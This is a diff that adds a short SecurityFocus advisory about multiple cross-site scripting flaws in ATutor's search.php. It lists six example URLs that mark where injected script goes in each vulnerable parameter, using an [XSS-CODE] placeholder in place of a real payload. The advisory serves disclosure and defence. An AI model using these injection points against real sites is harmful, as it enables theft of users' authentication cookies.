@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/13972/info
+    
+ATutor is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+    
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/atutor/search.php?search=10[XSS-CODE]&words=kk&include=all&find_in=this&display_as=pages&search=Search
+http://www.example.com/ATutor/search.php?search=1&words=aa[XSS-CODE]&include=one&find_in=all&display_as=summaries&search=Search#search_results
+http://www.example.com/ATutor/search.php?search=1&words=aa&include=one[XSS-CODE]&find_in=all&display_as=summaries&search=Search#search_results
+http://www.example.com/ATutor/search.php?search=1&words=aa&include=one&find_in=all[XSS-CODE]&display_as=summaries&search=Search#search_results
+http://www.example.com/ATutor/search.php?search=1&words=aa&include=one&find_in=all&display_as=[XSS-CODE]summaries&search=Search#search_results
+http://www.example.com/ATutor/search.php?search=1&words=aa&include=one&find_in=all&display_as=summaries&search=[XSS-CODE]Search#search_results
